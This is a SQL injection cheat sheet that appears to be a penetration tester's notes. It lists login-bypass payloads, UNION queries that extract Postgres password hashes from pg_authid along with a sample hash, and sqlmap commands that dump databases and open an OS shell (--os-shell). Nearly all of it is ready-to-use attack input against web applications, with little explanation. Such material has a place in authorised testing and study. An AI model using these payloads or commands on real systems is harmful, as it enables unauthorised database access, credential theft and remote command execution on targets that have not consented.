# SQL Injection Cheatsheet

Testing for Bypasses:&#x20;

```
+-------------------------------+
|	  ' or 1=1 --		|
|	tom' or 1=1 LIMIT 1;#	|
|	  a' or 1=1 --	    	|
|	  " or 1=1 --	    	|
|	  a" or 1=1 --	    	|
|	  ' or 1=1 #	    	|
|	  " or 1=1 #	    	|
|	  or 1=1 --	    	|
|	  ' or 'x'='x	    	|
|	  " or "x"="x		|
|	  ') or ('x'='x	    	|
|	  ") or ("x"="x	    	|
| ' or username LIKE '%admin%   |
+-------------------------------+
|      USERNAME:  ' or 1/*      |
|      PASSWORD:  */ =1 --      |
+-------------------------------+
|  USERNAME: admin' or '1'='1   |
|  PASSWORD: '#		    	|
+-------------------------------+
'OR 1 OR'
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 -- -
```

## UNION Attacks:

Find number of columns by using ORDER by until you get an error for too many columns:

```
' ORDER by 1--
' ORDER by 2--
```

Find table\_names:

```
' UNION SELECT NULL,NULL,NULL,NULL,table_name from information_schema.tables--
```

Find columns:

```
'+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL%2Ccolumn_name+from+information_schema.columns+where+table_name='pg_authid'--
```

Get data we are looking for: rolname and rolpassword

```
'+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL%2Crolpassword+from+pg_authid--' 
```

postgres/md52d58e0637ec1e94cdfba3d1c26b67d01

## SQLMAP

### Copy POST request from burp and run with it

`sqlmap -r request.txt --dbms=mysql --dump`

### sqlmap crawl

`sqlmap -u http://172.21.0.0 --crawl=1`

### sqlmap dump database

`sqlmap -u http://172.21.0.0 --dbms=mysql --dump`

### sqlmap shell

`sqlmap -u http://172.21.0.0 --dbms=mysql --os-shell`

## SQLI

Testing for a row:

* http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8

#### Get users table

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_s
chema.columns where table_name='users'
```

## Links

https://www.exploit-db.com/papers/12975&#x20;

https://www.exploit-db.com/papers/13045&#x20;

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md

(MSSQL) https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/ https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-(mssql).pdf
